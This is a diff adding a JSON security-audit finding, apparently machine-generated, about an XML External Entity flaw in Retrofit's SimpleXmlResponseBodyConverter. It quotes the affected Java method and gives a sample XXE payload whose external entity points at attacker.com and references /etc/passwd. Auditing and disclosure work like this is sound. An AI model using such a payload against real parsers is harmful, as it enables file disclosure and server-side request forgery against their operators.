@@ -1,0 +1,23 @@
+[
+  {
+    "FindingID": "18eb00b8-ca8b-5b62-8a6a-93982ad91309",
+    "SessionID": "ChA2YTdmYmI2ZDQ0OTIwZWYyEAgaATAqBG1haW4",
+    "Title": "XML External Entity (XXE) Injection in SimpleXmlResponseBodyConverter",
+    "FilePath": "/home/jfplante_google_com/repos/p22-retrofit_rep2/retrofit-converters/simplexml/src/main/java/retrofit2/converter/simplexml/SimpleXmlResponseBodyConverter.java",
+    "Severity": "HIGH",
+    "Confidence": 90,
+    "Analysis": "The SimpleXmlResponseBodyConverter class uses Simple Framework's `Serializer` (usually instantiated as a default `org.simpleframework.xml.core.Persister`) to read XML from an untrusted `ResponseBody` via `serializer.read(cls, value.charStream(), strict)`. By default, the `Persister` implementation in SimpleXML is vulnerable to XML External Entity (XXE) attacks because it does not disable external DTDs or external parameter entities when resolving XML schemas and objects. This allows attackers to send malicious XML documents containing external entities to perform arbitrary file reads, Server-Side Request Forgery (SSRF), or cause Denial of Service (DoS) on systems parsing these responses.\n\n**Conceptual Exploit Payload:**\nAn attacker controls an API endpoint queried via a Retrofit client utilizing `SimpleXmlConverterFactory`. When the client executes a request, the attacker responds with:\n```xml\n\u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e\n\u003c!DOCTYPE root [\n  \u003c!ENTITY xxe SYSTEM \"http://attacker.com/leak?data=/etc/passwd\"\u003e\n]\u003e\n\u003cmy-object\u003e\n  \u003cmessage\u003e\u0026xxe;\u003c/message\u003e\n  \u003ccount\u003e10\u003c/count\u003e\n\u003c/my-object\u003e\n```\nWhen parsed by `SimpleXmlResponseBodyConverter.convert(ResponseBody)`, the external entity `xxe` is resolved, sending the server's local file or performing an SSRF request to `attacker.com`.",
+    "Snippet": "  @Override\n  public T convert(ResponseBody value) throws IOException {\n    try {\n      T read = serializer.read(cls, value.charStream(), strict);\n      if (read == null) {\n        throw new IllegalStateException(\"Could not deserialize body as \" + cls);\n      }\n      return read;\n    } catch (RuntimeException | IOException e) {\n      throw e;\n    } catch (Exception e) {\n      throw new RuntimeException(e);\n    } finally {\n      value.close();\n    }\n  }",
+    "VulnType": "CWE-611",
+    "VulnID": "CWE-611",
+    "Fingerprint": "",
+    "Status": "OPEN",
+    "SourceStage": "",
+    "FindingJSON": "",
+    "UpdatedAt": "",
+    "StartLine": 35,
+    "EndLine": 49,
+    "DismissReason": "",
+    "ConfidenceLevel": ""
+  }
+]
